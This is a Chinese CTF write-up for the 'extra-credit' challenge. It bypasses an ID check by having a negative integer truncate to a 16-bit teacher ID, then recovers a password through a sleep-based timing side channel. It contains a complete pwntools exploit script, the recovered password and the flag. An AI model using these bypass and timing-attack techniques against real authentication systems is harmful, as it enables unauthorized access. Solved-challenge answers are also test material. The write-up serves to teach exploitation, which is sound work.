# extra-credit

## 题目简述

程序只拒绝 `id > 10`，却在 `showGrade` 中先把 32 位 `int` 强制转换为 16 位 `short`。教师入口编号为 `0x0BEE`，因此可以提交一个小于 10 的负数，使截断后的低 16 位变为该值。教师密码比较还故意在每轮比较前后各暂停 5 ms，形成按正确前缀长度增长的时间侧信道。

## 解题过程

选择

$$-62482\bmod2^{16}=3054=0x0BEE.$$

它能通过 `id > 10` 检查，转成 `short` 后进入教师视图。密码字符集为小写字母和数字，长度为 8。比较到错误字符时只经历本轮前一次睡眠；猜对当前字符后还会经历本轮后一次睡眠并继续下一轮，所以正确候选会稳定多出约 10 ms。

为降低调度抖动，对每个候选重复测量并比较中位数：

```python
import statistics
import string
import time
from pwn import process, remote

BINARY = "./gradeViewer"
TEACHER_ID = b"-62482"
ALPHABET = string.ascii_lowercase + string.digits

def one_measurement(attempt: str) -> float:
    io = process(BINARY)
    io.sendlineafter(b"student ID: ", TEACHER_ID)
    io.recvuntil(b"[a-z, 0-9]:")
    start = time.perf_counter()
    io.sendline(attempt.encode())
    io.recvall()
    elapsed = time.perf_counter() - start
    io.close()
    return elapsed

password = ""
for index in range(8):
    scores = {}
    for candidate in ALPHABET:
        attempt = (password + candidate).ljust(8, "0")
        scores[candidate] = statistics.median(
            one_measurement(attempt) for _ in range(5)
        )
    password += max(scores, key=scores.get)
    print(password)

assert password == "f1shc0de"

io = remote("challenge-host", 12345)
io.sendlineafter(b"student ID: ", TEACHER_ID)
io.sendlineafter(b"[a-z, 0-9]:", password.encode())
print(io.recvall().decode())
```

恢复的密码为 `f1shc0de`；对发布的二进制执行 `strings` 也能验证这个字面量，但主解法不依赖该捷径。认证成功后得到：

```text
tjctf{th4nk_y0u_f0r_sav1ng_m3y_grade}
```

## 方法总结

- 核心技巧：先利用有符号整数截断进入隐藏分支，再用逐字节时间侧信道恢复秘密。
- 识别信号：只检查上界的整数输入随后被强转为 `short`，以及按比较进度执行的固定延迟。
- 复用要点：网络或本机调度会产生噪声，应做多次采样取中位数；每轮使用等长猜测，避免输入长度本身影响时间。
